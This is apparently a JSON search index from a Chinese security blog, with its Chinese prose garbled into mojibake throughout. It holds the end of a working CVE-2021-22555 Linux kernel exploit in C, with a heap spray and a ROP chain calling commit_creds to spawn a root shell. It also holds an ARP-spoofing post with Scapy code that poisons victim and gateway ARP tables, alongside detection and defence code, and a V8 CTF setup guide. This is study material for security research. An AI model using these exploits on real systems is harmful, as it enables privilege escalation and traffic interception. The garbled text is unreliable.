printf(\"\\033[32m\\033[1m[+] STAGE 4: Kernel code execution\\033[0m\\n\");\n// 4-1. use skb to forge fake pipe_buffer\n  printf(\"[*] Spraying fake pipe_buffer objects...\\n\");\n  memset(secondary_buf, 0, sizeof(secondary_buf));\n\n  //hijack rsp\n  fake_pipe_buffer = (struct pipe_buffer *)&secondary_buf;\n  fake_pipe_buffer->ops = kheap_addr;\n  \n  fake_pipe_buffer_ops = (struct pipe_buf_operations *)secondary_buf;\n  fake_pipe_buffer_ops->release = kernel_offset + PUSH_RSI_JMP_RSI_0x2E;                  //\n  fake_pipe_buffer_ops->confirm = kernel_offset + ADD_RSP_0x98_RET;\n\n  uint64_t *mid_gadget;\n  mid_gadget = (uint64_t*) (uint64_t*) &secondary_buf[0x2e];\n  mid_gadget[0] = kernel_offset + POP_RSP_RET;\n\n// 4-2. construct ROP chain\n  //build rop\n    int rop_idx = 0;\n    rop_chain = (uint64_t*) &secondary_buf[0xa0];\n    rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;\n    rop_chain[rop_idx++] = kernel_offset + INIT_CRED;\n    rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;\n    rop_chain[rop_idx++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + 22;\n    rop_chain[rop_idx++] = *(uint64_t*) \"PIG007XX\";\n    rop_chain[rop_idx++] = *(uint64_t*) \"PIG007XX\";\n    rop_chain[rop_idx++] = getRootShell;\n    rop_chain[rop_idx++] = user_cs;\n    rop_chain[rop_idx++] = user_eflags;\n    rop_chain[rop_idx++] = user_sp;\n    rop_chain[rop_idx++] = user_ss;\n\n\n  if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) < 0)\n    goto err_rmid;\n// 4-3. trigger pipe_release()\n  printf(\"[*] Releasing pipe_buffer objects...\\n\");\n  printf(\"\\n\");\n  for (int i = 0; i < NUM_PIPEFDS; i++) {\n    if (close(pipefd[i][0]) < 0) {\n      perror(\"[-] close\");\n      goto err_rmid;\n    }\n    if (close(pipefd[i][1]) < 0) {\n      perror(\"[-] close\");\n      goto err_rmid;\n    }\n  }\n  return 0;\n\nerr_rmid:\n  for (int i = 0; i < NUM_MSQIDS; i++) {\n    if (i == fake_idx)\n      continue;\n    if (msgctl(msqid[i], IPC_RMID, NULL) < 0)\n      perror(\"[-] msgctl\");\n  }\n\nerr_no_rmid:\n  return 1;\n}\n```\n\næ•ˆæœï¼š\n\nä¸­é—´æœ‰ä¸ª`getchar()`ï¼ŒæŒ‰ä¸‹å›è½¦å³å¯ï¼Œæœ¬æ¥æ”¾è¿™æ˜¯ä¸ºäº†æ–¹ä¾¿è°ƒè¯•çš„ã€‚\n\n![image-20220515143144038](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220515143144038.png)\n\nä¸è¡Œçš„è¯å¯ä»¥å¤šå°è¯•å‡ æ¬¡\n\nç„¶åé€ƒé€¸å®¹å™¨çš„æˆ‘æ²¡å°è¯•ï¼Œä¹Ÿä¸å¤ªä¼šï¼Œå¯ä»¥å‚è€ƒ[arttnba3å¸ˆå‚…çš„å®¹å™¨é€ƒé€¸EXP](https://arttnba3.cn/2022/04/01/CVE-0X07-CVE-2021-22555/#FINAL-EXPLOIT)\n\n# å‚è€ƒ\n\n[CVE-2021-22555 2å­—èŠ‚å †æº¢å‡ºå†™0æ¼æ´ææƒåˆ†æ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/254027)\n\n[ã€CVE.0x07ã€‘CVE-2021-22555 æ¼æ´å¤ç°åŠç®€è¦åˆ†æ - arttnba3's blog](https://arttnba3.cn/2022/04/01/CVE-0X07-CVE-2021-22555/#Final-EXPLOIT)\n\n[CVE-2021-22555: Turning \\x00\\x00 into 10000$ | security-research (google.github.io)](https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html)\n\nå¤ªå¤šäº†ï¼Œæœ‰ç‚¹è´´ä¸è¿‡æ¥äº†....\n","tags":["Kernel_CVE"],"categories":["Kernel_CVE"]},{"title":"arp_spoof","url":"/2022/03/07/arp_spoof/","content":"\n# ä¸€ã€åŸç†\n\n## 1.æ”»å‡»\n\n### (1)æ¬ºéª—å—å®³è€…\n\nå‘å—å®³è€…å‘åŒ…ï¼Œæ¬ºéª—å—å®³è€…æœ¬æœºä¸ºç½‘å…³ï¼Œä½¿å¾—å—å®³è€…çš„ARPè¡¨ä¸­æœ¬æœºçš„MACåœ°å€ä¸ºç½‘å…³çš„MACåœ°å€ã€‚\n\n```python\ndef build_rep(target_ip, gateway_ip):\n    global self_mac\n    target_mac = getmacbyip(target_ip)\n    #print(gateway_ip)\n    if target_ip is None:\n        print(\"[-] Error: Could not resolve targets MAC address\")\n        sys.exit(1)\n    # Etherå¯¹åº”åŒ…çš„srcå’Œdst   ARPåªä¼šä¿®æ”¹å…¶ä¸­çš„ARPåŒ…ï¼Œå‘Šè¯‰dstï¼Œè¿™ä¸ªåŒ…çš„macæ˜¯hwsrcï¼Œipæ˜¯psrcï¼Œå‘ç»™hwdst/pdst\n    pkt = Ether(src=self_mac, dst=target_mac) / ARP(hwsrc=self_mac, psrc=gateway_ip, hwdst=target_mac, pdst=target_ip,\n                                                    op=2)\n        # æœ¬æœºmac å—æ¬ºéª—çš„ä¸»æœºmac æœ¬æœºmac ç½‘å…³çš„ipåœ°å€ è¢«æ”»å‡»äººçš„mac è¢«æ”»å‡»äººçš„ip OPå€¼æ˜¯è¡¨ç¤ºè¯·æ±‚è¿˜æ˜¯å›åº” 1ï¼šè¯·æ±‚  2ï¼šå›åº”\n        # é‚£ä¹ˆè¿™ç§æ¨¡å¼ä¸‹å³æœ¬æœºå‘å¾€å—å®³è€…ï¼Œå‘Šè¯‰å—å®³è€…ç½‘å…³(psrc)çš„macåœ°å€æ˜¯æœ¬æœº(self_mac)ï¼Œä¸‹å›ä¾æ®IPæŸ¥ARPè¡¨å°±ä¼šæŠŠåº”è¯¥å‘ç»™ç½‘å…³çš„åŒ…é€šè¿‡macå‘åŒ…å‘ç»™æœ¬æœº\n    return pkt\n```\n\n### (2)æ¬ºéª—ç½‘å…³\n\nå‘ç½‘å…³å‘åŒ…ï¼Œæ¬ºéª—ç½‘å…³å—å®³è€…ä¸ºæœ¬æœºï¼Œä½¿å¾—ç½‘å…³çš„ARPè¡¨ä¸­å—å®³è€…çš„MACåœ°å€ä¸ºæœ¬æœºçš„MACåœ°å€\n\n```python\ndef build_req(target_ip, gateway_ip):\n    global self_mac\n    target_mac = getmacbyip(target_ip)\n    gateway_mac = getmacbyip(gateway_ip)\n    if target_mac is None:\n        print(\"[-] Error: Could not resolve targets MAC address\")\n        sys.exit(1)\n\n    #Etherå¯¹åº”åŒ…çš„srcå’Œdst   ARPåªä¼šä¿®æ”¹å…¶ä¸­çš„ARPåŒ…ï¼Œå‘Šè¯‰dstï¼Œè¿™ä¸ªåŒ…çš„macæ˜¯hwsrcï¼Œipæ˜¯psrcï¼Œå‘ç»™hwdst/pdst\n    pkt = Ether(src=self_mac, dst=gateway_mac) / ARP(hwsrc=self_mac, psrc=target_ip, hwdst=gateway_mac, pdst = gateway_ip,\n                                                  op=1)\n    # æœ¬æœºmac ç½‘å…³mac æœ¬æœºmac å—æ¬ºéª—çš„ä¸»æœºmac ç½‘å…³mac ç½‘å…³çš„ipåœ°å€ OPå€¼æ˜¯è¡¨ç¤ºè¯·æ±‚è¿˜æ˜¯å›åº” 1ï¼šè¯·æ±‚  2ï¼šå›åº”\n    # é‚£ä¹ˆè¿™ç§æ¨¡å¼ä¸‹å³æœ¬æœºå‘å¾€ç½‘å…³ï¼Œå‘Šè¯‰ç½‘å…³å—å®³è€…(psrc)çš„macåœ°å€æ˜¯æœ¬æœº(self_mac)ï¼Œä¸‹å›ä¾æ®IPæŸ¥ARPè¡¨å°±ä¼šæŠŠåº”è¯¥å‘ç»™å—å®³è€…çš„åŒ…é€šè¿‡macå‘åŒ…å‘ç»™æœ¬æœº\n    return pkt\n```\n\n### (3)æ¬ºéª—æ‰€æœ‰äºº\n\nå‘å¹¿æ’­åœ°å€å‘åŒ…ï¼Œä½¿å¾—æ‰€æœ‰äººçš„ARPéƒ½è¢«ä¿®æ”¹ï¼Œä»è€Œæ¬ºéª—æ‰€æœ‰äººï¼Œè¿™ä¸ªæ²¡æœ‰å®ç°ï¼Œæ„Ÿè§‰åŠ¨é™å¤ªå¤§ï¼Œæ²¡å•¥ç”¨\n\n\n\n## 2.é˜²å¾¡\n\n### (1)æ£€æµ‹\n\n#### â‘ repæ¨¡å¼\n\nè¿™ç§æ¨¡å¼æœ¬æœºçš„arpè¡¨ä¸­çš„MACåœ°å€ä¼šæ”¹å˜ï¼Œlinuxä¸‹ç”±äºè¾“å…¥arpåŠ è½½æ¯”è¾ƒæ…¢ï¼Œä¼°è®¡åå°ä¼šè¿›è¡Œpingï¼Œæ‰€ä»¥ä½¿ç”¨`ip neigh`æ¥è·å–ï¼Œä»ä¸­æ‰¾åˆ°æ˜¯å¦å­˜åœ¨ç›¸åŒçš„MACåœ°å€ï¼Œä»è€Œåˆ¤æ–­æ˜¯å¦è¢«è¯¥æ¨¡å¼æ”»å‡»ï¼Œå³è½¬åŒ–ä¸ºsetçœ‹é•¿åº¦æ˜¯å¦ç›¸åŒ\n\n```python\n#detect_rep\nif(len(ip_mac_dictionary) != len(set(ip_mac_dictionary.values()))):\n    print(\"rep_get\")\n    rep_detect_flag = True\n```\n\n#### â‘¡reqæ¨¡å¼\n\nè¿™ç§æ¨¡å¼ä¸‹æˆ‘ä»¬å¯ä»¥å°è¯•arpingç½‘å…³ï¼Œå¦‚æœMACåœ°å€æ²¡è¢«ä¿®æ”¹ï¼Œè€Œarpingç½‘å…³ä¸èƒ½é€šï¼Œé‚£ä¹ˆå°±æ˜¯ç½‘å…³è¢«æ¬ºéª—ï¼Œä¾æ®æ­¤æ¥è¿›è¡Œæ£€æµ‹\n\n```python\n#detect_req\ngateway_mac = getmacbyip(gateway_ip)\np = subprocess.Popen([\"arping\",\"-i\",netD_name,\"-c\",\"1\",gateway_mac], stdout=subprocess.PIPE)\nfor line in p.stdout.readlines():\n    line_splitby_space = line.decode(\"utf-8\").strip().split(\" \")\n    if(\"Timeout\" in line_splitby_space):\n        req_detect_flag = True\n        break\n```\n\n### (2)å®é™…é˜²å¾¡\n\n#### â‘ repæ¨¡å¼\n\nç›´æ¥å°†ç½‘å…³çœŸå®çš„MACåœ°å€å’Œå¯¹åº”IPè¿›è¡Œé™æ€ç»‘å®šå³å¯ã€‚è·å–ç½‘å…³çœŸå®MACåœ°å€ï¼Œå¯ä»¥ä½¿ç”¨getmacbyipå‡½æ•°ï¼Œè¯¥å‡½æ•°ä¼šå‘å±€åŸŸç½‘å†…å¹¿æ’­ï¼Œè¯¢é—®ç½‘å…³çœŸå®çš„MACçš„åœ°å€ï¼Œè€Œæ”»å‡»è€…é‚£é‡Œè‚¯å®šå­˜åœ¨çœŸå®çš„MACåœ°å€ï¼Œæ‰€ä»¥åŸºæœ¬ä¸€å®šèƒ½è·å¾—åˆ°çœŸå®çš„IPåœ°å€\n\n![image-20220307120520964](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203071205089.png)\n\n```python\nif(rep_detect_flag):\n    self.ui.defenseInfoText.appendPlainText(\"Defending against arp_rep attacks......\")\n    build_rep_defense()\n    p = subprocess.Popen([\"ip\", \"neigh\"], stdout=subprocess.PIPE)\n    for line in p.stdout.readlines():\n        line_splitby_space = line.decode(\"utf-8\").strip().split(\" \")\n        if (\"FAILED\" not in line_splitby_space):\n            self.ui.defenseInfoText.appendPlainText('{:<30s}'.format(line_splitby_space[0]) + \"\\t\" + line_splitby_space[4])\n```\n\nè¿™é‡Œæˆ‘ç›´æ¥ä¿®æ”¹æ‰€æœ‰çš„çš„IP_MACä¸ºé™æ€çš„\n\n#### â‘¡reqæ¨¡å¼\n\nç”±äºæ˜¯ç½‘å…³è¢«æ¬ºéª—äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿå¯ä»¥å‘ç½‘å…³å‘åŒ…ï¼Œä½¿å…¶å°†æˆ‘çš„IPå’ŒMACçœŸå®å†™å…¥ARPæ¬ºéª—ï¼Œä½†æ˜¯æ”»å‡»è€…å¯èƒ½ä¼šä¸€ç›´å‘åŒ…ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿéœ€è¦ä¸€ç›´å‘åŒ…æ‰èƒ½æ–­ç»­é˜²å¾¡æ”»å‡»ï¼Œä¸è¿‡è¿˜æ˜¯å¯èƒ½ä¼šä¸¢ä¸å°‘åŒ…ã€‚\n\n```python\ndef build_req_defense():\n    global gateway_ip\n    global self_mac\n    self_ip = get_self_ip()\n    #self_mac = get_if_hwaddr(netD_name)\n    gateway_mac = getmacbyip(gateway_ip)\n    #Etherå¯¹åº”åŒ…çš„srcå’Œdst   ARPåªä¼šä¿®æ”¹å…¶ä¸­çš„ARPåŒ…ï¼Œå‘Šè¯‰dstï¼Œè¿™ä¸ªåŒ…çš„macæ˜¯hwsrcï¼Œipæ˜¯psrcï¼Œå‘ç»™hwdst/pdst\n    pkt = Ether(src=self_mac, dst=gateway_mac) / ARP(hwsrc=self_mac, psrc=self_ip, hwdst=gateway_mac, pdst = gateway_ip,op=1)\n    return pkt\n```\n\nå¦‚ä¸Šè®¾ç½®åŒ…å†…å®¹ï¼Œå‘Šè¯‰ç½‘å…³æˆ‘æ‰æ˜¯çœŸçš„ã€‚\n\næˆ–è€…æœ‰ç½‘å…³æƒé™çš„ï¼Œç›´æ¥åœ¨ç½‘å…³çš„shellè¿›è¡Œé™æ€ç»‘å®šã€‚\n\n\n\n# äºŒã€pyQtç•Œé¢\n\n## 1.ç¯å¢ƒæ­å»º\n\nä¸»è¦é…åˆpycharmï¼Œå…ˆå®‰è£…pyQt5ï¼Œç„¶ååœ¨å¯¹åº”çš„åŒ…é‡Œå³å¯æ‰“å¼€\n\n```bash\npip3 install PyQt5\n/home/hacker/.local/lib/python3.6/site-packages/qt5_applications/Qt/bin/designer\n```\n\n## 2.é…åˆpycharm\n\nä¸»è¦è®¾ç½®ä¸€ä¸‹å³å¯\n\nFile->setting->Tools->External Tools->+ä¸€ä¸‹å·¥å…·\n\n### Qt_Designer\n\n![image-20220307112101403](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203071121488.png)\n\nç›´æ¥ç‚¹å‡»å³å¯åŠ è½½\n\n![image-20220307112540614](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203071125687.png)\n\n\n\n### UIè½¬py\n\nè½¬å®Œä¹‹åä¼šæ¯”è¾ƒèˆ’æœï¼Œå› ä¸ºåœ¨pycharmä¸­å¯ä»¥æç¤ºç›¸å…³çš„æ§ä»¶ï¼Œä½†æ˜¯ç›´æ¥loadåŠ è½½uiæ–‡ä»¶çš„è¯å°±æ²¡æœ‰æç¤ºã€‚\n\n![image-20220307112150183](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203071121263.png)\n\nArgumentsçš„å‘½ä»¤å‚æ•°ä¸ºï¼š\n\n```\n-m PyQt5.uic.pyuic $FileName$ -o $FileNameWithoutExtension$.py\n```\n\nç›®å‰å¥½åƒpy->uiæ²¡åŠæ³•è½¬å›å»\n\nä¹‹åç‚¹å‡»è¦è½¬æ¢çš„uiæ–‡ä»¶ï¼Œç„¶åå¯¹åº”çš„æ‰“å¼€å·¥å…·å³å¯åœ¨å½“å‰æ–‡ä»¶å¤¹ä¸‹ç”Ÿæˆpyæ–‡ä»¶\n\n![image-20220307112701929](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203071127006.png)\n\nå¯¹åº”å°±ä¼šç”Ÿæˆ`window.py`æ–‡ä»¶\n\n## 3.ç•Œé¢å¯åŠ¨\n\n```python\nclass MainWindow(QMainWindow):\n    def __init__(self):\n        super().__init__()\n        #å¯¼å…¥ui\n        self.ui = Ui_MainWindow()\n        \nif __name__ == '__main__':\n    app = QApplication([])\n    myWindow = MainWindow()\n    myWindow.show()\n    sys.exit(app.exec_())\n```\n\n## 4.ç•Œé¢é€€å‡º\n\nä¸€èˆ¬ç•Œé¢éƒ½æ˜¯å¤šçº¿ç¨‹çš„ï¼Œæ‰€ä»¥é€€å‡ºçš„æ—¶å€™ä¸€èˆ¬éœ€è¦åŠ ä¸Šä¸€äº›ä¸œè¥¿å°†ä¸€äº›çº¿ç¨‹ç»™å…³é—­ï¼Œå®‰å…¨é€€å‡ºï¼Œæ‰€ä»¥éœ€è¦é‡å†™ä¸€ä¸‹çª—å£å…³é—­çš„closeEventå‡½æ•°\n\n```python\ndef closeEvent(self, event):\n    for key in threads_flag_dictionary.keys():\n        threads_flag_dictionary[key].set()#ç›¸å…³çº¿ç¨‹ç»ˆæ­¢flagè®¾ç½®\n    event.accept()\n    os._exit(0)\n```\n\n\n\n# ä¸‰ã€åˆ©ç”¨å‡½æ•°è¯¦è§£\n\n## 1.å‘åŒ…å‡½æ•°\n\n### (1)Ether\n\nä¸»è¦å°±æ˜¯ä½¿ç”¨Etheråˆ›å»ºä¸€ä¸ªMACæ•°æ®å¸§å¤´ï¼Œå³æºMACåœ°å€ï¼Œè¦å‘å¾€çš„MACåœ°å€ï¼Œè¿™ä¸ªä¸èƒ½æ›´æ”¹ï¼Œç”¨æ¥åœ¨å±€åŸŸç½‘ä¸­è®¾ç½®å‘å¾€çš„åœ°æ–¹ã€‚\n\n```python\nEther(src=self_mac, dst=gateway_mac)\n```\n\n### (2)ARP\n\nè¿™ä¸ªå°±æ˜¯ç”¨æ¥ä¼ªé€ æ•°æ®åŒ…ä¸­çš„ARPæ•°æ®ï¼Œå¯ä»¥éšä¾¿æ”¹ï¼Œç›®æ ‡ä¸»æœºæ¥æ”¶åˆ°è¯¥æ•°æ®åŒ…çš„æ—¶å€™ï¼Œä¼šåˆ¤æ–­æ˜¯å¦å’Œæœ¬æœºçš„ARPè¡¨æ˜¯å¦ç›¸åŒï¼Œä¸åŒåˆ™ä¼šä¾æ®è¯¥ARPåŒ…æ¥è¿›è¡Œä¿®æ”¹ã€‚\n\n```python\nARP(hwsrc=self_mac, psrc=target_ip, hwdst=gateway_mac, pdst = gateway_ip,op=1)\n```\n\nARPæ¬ºéª—ä¸»è¦å°±æ˜¯ä¿®æ”¹`hwsrc/psrc`ï¼Œä½¿å¾—ç›®æ ‡ä¸»æœºçš„ARPè¡¨ä¾æ®è¯¥`hwsrc/psrc`æ¥å¯¹è‡ªå·±çš„ARPè¡¨è¿›è¡Œå†™å…¥ã€‚æ¯”å¦‚è¿™é‡Œå°±æ˜¯ä½¿å¾—ç›®æ ‡ä¸»æœºä¸­çš„ARPè¡¨ç”±åŸæœ¬æ­£ç¡®çš„`target_ip---target_MAC`å˜ä¸º`target_ip---self_mac`\n\n### (3)å®é™…å‘åŒ…\n\néœ€è¦å°†Etherå’ŒARPç»“åˆèµ·æ¥ç»„æˆä¸€ä¸ªMACå¸§pktï¼Œç„¶åå°±å¯ä»¥å°†è¯¥MACå¸§å‘å¾€ç½‘å¡`network driver`\n\n```python\npkt = Ether(src=self_mac, dst=gateway_mac) / ARP(hwsrc=self_mac, psrc=target_ip, hwdst=gateway_mac, pdst = gateway_ip,op=1)\n```\n\n#### â‘ send\n\nå·¥ä½œåœ¨ç¬¬ä¸‰å±‚ç½‘ç»œå±‚ï¼Œå‘é€IPæ•°æ®åŒ…ï¼ŒåŒ…å¤´éœ€è¦æ˜¯IPæ•°æ®åŒ…å¤´\n\n```python\nsend(IP(dst=\"192.168.1.107\")/ICMP())\n```\n\n#### â‘¡sendp\n\nå·¥ä½œåœ¨ç¬¬äºŒå±‚é“¾è·¯å±‚ï¼Œå‘é€MACå¸§ï¼ŒåŒ…å¤´éœ€è¦æ˜¯MACå¸§å¤´ï¼Œå³Ether\n\n```python\nsendp(pkt, inter=2, iface=netD_name)\n#è¿™é‡Œpktå°±æ˜¯åŒ…ï¼Œå³Ether()/ARP()ä¹‹ç±»çš„\n```\n\n## 2.çº¿ç¨‹å‡½æ•°\n\nä½¿ç”¨pyQtçº¿ç¨‹å‡½æ•°ï¼Œä¸€èˆ¬ä¸¤ç§æ–¹æ³•ï¼Œæ¯”è¾ƒå–œæ¬¢ç”¨threadingçš„\n\n### (1)çº¿ç¨‹å¯åŠ¨\n\n```python\n#è®¾ç½®ç»ˆæ­¢ä¿¡å·ï¼Œé˜²æ­¢çº¿ç¨‹ä¸€ç›´è¿è¡Œä¸åœæ­¢\nsend_thread_defense_stop_flag = threading.Event()\n#çº¿ç¨‹åˆ›å»ºï¼Œå¯¹åº”self.send_packå‡½æ•°ï¼Œå‚æ•°ä¸ºargs=(xxx,xxx,xxx)\nsend_thread = threading.Thread(target=self.send_pack, args=(pkt,send_thread_defense_stop_flag,\"defense\"))\n#çº¿ç¨‹å¯åŠ¨\nsend_thread.start()\n#å°†ç»ˆæ­¢ä¿¡å·æ·»åŠ è¿›å­—å…¸è¿›è¡Œç®¡ç†\nthreads_flag_dictionary['send_defense_thread'] = send_thread_defense_stop_flag\n```\n\n### (2)çº¿ç¨‹é˜»å¡\n\næœ‰æ—¶å€™éœ€è¦çº¿ç¨‹é˜»å¡ï¼Œå³å®Œæˆè¯¥çº¿ç¨‹æ‰è¿›è¡Œä¸‹ä¸€æ­¥ï¼Œé‚£ä¹ˆå°±éœ€è¦ç”¨åˆ°joinå‡½æ•°\n\n```python\n#ç”¨åœ¨send_thread.start()ä¹‹å\nsend_thread.join()\n```\n\n### (3)çº¿ç¨‹ç»ˆæ­¢\n\nå³ä¹‹å‰æåˆ°çš„è®¾ç½®å¯¹åº”çš„ç»ˆæ­¢flag\n\n```python\n#è§¦å‘åœæ­¢ä¿¡å·\nthreads_flag_dictionary['send_defense_thread'].set()\n\n#send_packå‡½æ•°ä¸­æŸäº›éœ€è¦ä¸€ç›´è¿è¡Œçš„ä»£ç å—ä¸­\nwhile (stop_flag.is_set()):\n\tpass\n```\n\n## 3.å…¶ä»–åŠŸèƒ½æ€§å‡½æ•°\n\n### (1)è·å–å­˜æ´»ä¸»æœºå‡½æ•°\n\nç”±äº`ip neigh`å‘½ä»¤ä¼šä»ä¸€ä¸ªå­˜æ´»ä¸»æœºçš„ç¼“å†²åŒºä¸­è·å–ç›¸å…³çš„ä¸»æœºï¼Œä½†æ˜¯å®é™…ä¸Šå¦‚æœæ–°åŠ å…¥ä¸€ä¸ªä¸»æœºï¼Œåˆ™ä¸ä¼šæ˜¾ç¤ºå‡ºæ¥ï¼Œé™¤éæ¥æ”¶åˆ°è¯¥ä¸»æœºçš„åŒ…ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸»åŠ¨å»pingä»–ä»¬ï¼Œçœ‹ä»–ä»¬æ˜¯å¦å­˜æ´»ã€‚\n\n```python\nip_prefix = '.'.join(gateway_ip.split('.')[:-1])\nthreads = []\nfor i in range(1, 256):\n    ip = '%s.%s' % (ip_prefix, i)\n    threads.append(threading.Thread(target=ping_ip, args={ip, }))\nfor i in threads:\n    i.start()\nfor i in threads:\n    i.join()\n\ndef ping_ip(ip_str):\n    cmd = [\"ping\", \"-c\",\"1\", ip_str]\n    output = os.popen(\" \".join(cmd)).readlines()\n    for line in output:\n        if str(line).upper().find(\"TTL\") >= 0:\n            print(\"ip: %s åœ¨çº¿\" % ip_str)\n```\n\n### (2)è·å–æœ¬IP\n\n```python\ndef get_self_ip():\n    global netD_name\n    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    return socket.inet_ntoa(fcntl.ioctl(s.fileno(), 0x8915, struct.pack('256s', bytes(netD_name[:15],'utf-8')))[20:24])\nself_ip = get_self_ip()\n```\n\n### (3)ä»stdoutè·å–è¾“å‡º\n\n```python\ndef get_conten_from_stdout(self,func):\n    sys.stdout = string_io = StringIO()\n    func()\n    sys.stdout = self._stdout\n    print_str = string_io.getvalue()\n    del string_io\n    return print_str\n\nprint_str = self.get_conten_from_stdout(pkt.show)\n```\n\n","tags":["arp_spoof"],"categories":["arp_spoof"]},{"title":"V8ä»0å¼€å§‹","url":"/2022/03/01/V8ä»0å¼€å§‹/","content":"\n\n\n# ä¸€ã€ç¯å¢ƒæ­å»º\n\nå‚ç…§[[åŸåˆ›\\]v8åˆ©ç”¨åˆæ¢ 2019 StarCTF oob å¤ç°åˆ†æ-Pwn-çœ‹é›ªè®ºå›-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|bbs.pediy.com](https://bbs.pediy.com/thread-268933.htm#msg_header_h1_5)\n\n## 1.ä»£ç†è®¾ç½®\n\n```bash\ngit config --global http.proxy http://ip:port\nexport {http,https}_proxy=\"http://ip:port\"\n```\n\n## 2.ä»£ç ä¸‹è½½\n\n```bash\ngit clone https://chromium.googlesource.com/chromium/tools/depot_tools.git\necho \"export PATH=/pathto/depot_tools:$PATH\" >> ~/.bashrc\n#è·å–v8æºç \nfetch v8\n#åˆ‡æ¢é¢˜ç›®å¯¹åº”ç‰ˆæœ¬çš„commit\ngit checkout 6dc88c191f5ecc5389dc26efa3ca0907faef3598\n# å·¥å…·åŒæ­¥\ngclient sync\n#åº”ç”¨é¢˜ç›®çš„è¡¥ä¸æ–‡ä»¶\n#ä¸€èˆ¬è€Œè¨€å‡ºé¢˜éƒ½æ˜¯äººä¸ºç»™æŸä¸ªç‰ˆæœ¬çš„v8åŠ ä¸€ä¸ªæ´ä¸Šå»ï¼Œæ‰€ä»¥ç”¨é¢˜ç›®ç»™çš„diffæ–‡ä»¶ç»™å¼•æ“åŠ æ´\ngit apply ../oob.diff\n\n#æœ‰çš„è€ç‰ˆæœ¬æœ€å¥½è¿˜æ˜¯ç”¨python2æ¥ç¼–è¯‘ï¼Œä¸ç„¶è¯­æ³•å¯èƒ½ä¼šå‡ºé”™\n# ç¼–è¯‘releaseç‰ˆæœ¬\n#æµ‹è¯•expç”¨releaseç‰ˆæœ¬ï¼Œç”¨debugç‰ˆæœ¬æµ‹è¯•é€šå¸¸ä¼šå‡ºé”™\n./tools/dev/v8gen.py x64.release\nninja -C ./out.gn/x64.release\n\n# ç¼–è¯‘debugç‰ˆæœ¬\n#è°ƒè¯•ç”¨debugç‰ˆæœ¬\n./tools/dev/v8gen.py x64.debug\nninja -C ./out.gn/x64.debug\n```\n\n\n\n\n\n# äºŒã€å‰ç½®çŸ¥è¯†\n\nå‚è€ƒï¼š[ä»ä¸€é“CTFé¢˜é›¶åŸºç¡€å­¦V8æ¼æ´åˆ©ç”¨ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·](https://www.freebuf.com/vuls/203721.html)\n\n## 1.è°ƒè¯•çŸ¥è¯†\n\néœ€è¦æ³¨æ„çš„æ˜¯debugç‰ˆæœ¬çš„ç”¨æ¥è¾…åŠ©æ˜¾ç¤ºï¼Œç›´æ¥æ˜¯æ²¡åŠæ³•è¿è¡Œç›¸å…³ä»£ç çš„ï¼Œrealseç”¨æ¥å®é™…è¿è¡Œã€‚\n\n### (1)å·¥å…·\n\nå¸¸è§çš„pwndbgï¼Œå¯ä»¥æ­é…å¦‚ä¸‹çš„å°å·¥å…·\n\næºç çš„`/pathto/v8/tools`ç›®å½•ä¸‹æœ‰ä¸“é—¨ç”¨æ¥è°ƒè¯•v8çš„gdbinitï¼ŒåŠ åœ¨`~/.gdbinit`ä¸­å³å¯\n\n```\nsource /pathto/v8/tools/gdbinit\n```\n\n### (2)å‡½æ•°\n\nåœ¨è¿è¡Œ./d8æ—¶åŠ å…¥`--allow-natives-syntax`é€‰é¡¹ï¼Œå¯ä»¥ä½¿ç”¨ä¸€äº›è°ƒè¯•å‡½æ•°\n\n```bash\n./d8 --allow-natives-syntax\n#æˆ–è€…é…åˆgdb\ngdb ./d8\nset args --allow-natives-syntax ./test.js\nr\n```\n\nå¦‚ä¸‹å‡½æ•°\n\n```javascript\n%DebugPrint(obj) //è¾“å‡ºå¯¹è±¡åœ°å€\n%SystemBreak() //è§¦å‘è°ƒè¯•ä¸­æ–­ä¸»è¦ç»“åˆgdbç­‰è°ƒè¯•å™¨ä½¿ç”¨ï¼Œç±»ä¼¼äºpythonä¸­çš„dbg()æ–­ç‚¹\n```\n\nç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š\n\n```js\nvar a = [1,2,3];\nvar b = [1.1, 2.2, 3.3];\nvar c = [a, b];\n%DebugPrint(a);\n%SystemBreak();  //è§¦å‘ç¬¬ä¸€æ¬¡è°ƒè¯•\n%DebugPrint(b);\n%SystemBreak();  //è§¦å‘ç¬¬äºŒæ¬¡è°ƒè¯•\n%DebugPrint(c);\n%SystemBreak();  //è§¦å‘ç¬¬ä¸‰æ¬¡è°ƒè¯•\n```\n\n\n\n## 2.åŸºç¡€çŸ¥è¯†\n\n### (1)å¯¹è±¡å†…å­˜è®²è§£\n\n```js\nvar a = [1,2,3];\n```\n\næ¯”å¦‚å¦‚ä¸‹å®šä¹‰æ•°ç»„å¯¹è±¡aï¼Œé‚£ä¹ˆè¿è¡Œ`%DebugPrint(a);`å¾—åˆ°åœ°å€åï¼Œä½¿ç”¨jobå‘½ä»¤å¯ä»¥çœ‹åˆ°å¦‚ä¸‹çš„å†…å­˜å¸ƒå±€\n\n![image-20220301220834343](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203012217111.png)\n\nv8åœ¨å†…å­˜ä¸­åªæœ‰æ•°å­—å’Œå¯¹è±¡ä¸¤ç§è¡¨ç¤ºã€‚ä¸ºäº†åŒºåˆ†ä¸¤è€…ï¼Œv8åœ¨æ‰€æœ‰å¯¹è±¡çš„å†…å­˜åœ°å€æœ«å°¾éƒ½åŠ 